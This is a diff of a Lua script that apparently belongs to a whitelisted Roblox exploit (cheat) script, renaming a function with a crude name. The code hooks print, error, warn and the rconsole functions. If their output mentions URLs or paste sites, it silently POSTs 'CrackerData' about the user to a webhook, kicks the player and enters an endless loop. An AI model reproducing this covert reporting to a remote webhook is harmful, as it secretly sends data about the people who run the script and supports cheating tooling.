@@ -7,7 +7,7 @@ local LWP
 LWP = hookfunction(print,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -20,7 +20,7 @@ local LWE
 LWE = hookfunction(error,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+        nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -33,7 +33,7 @@ local LWW
 LWW = hookfunction(warn,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -46,7 +46,7 @@ local LWWR
 LWWR = hookfunction(rconsoleprint,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -59,7 +59,7 @@ local LWWM
 LWWM = hookfunction(rconsoleerr,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -72,7 +72,7 @@ local LWWN
 LWWN = hookfunction(rconsolewarn,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -85,7 +85,7 @@ local LWWZ
 LWWZ = hookfunction(rconsoleclear,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -98,7 +98,7 @@ local LWWH
 LWWH = hookfunction(rconsoleinput,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
 task.wait(3)
        while true do
@@ -111,7 +111,7 @@ local LWWT
 LWWT = hookfunction(rconsolename,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        wutdahell()
+       nocrakbitch()
        LocalPlayer:Kick(msg)
        task.wait(3)
        while true do
@@ -299,7 +299,7 @@ else
    LocalPlayer:Kick("Execution Failed | WL_ID: (21z7y16): You are not whitelisted!")
 end
 
-local function wutdahell()
+function nocrakbitch()
     HttpRequest({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})
 end
 
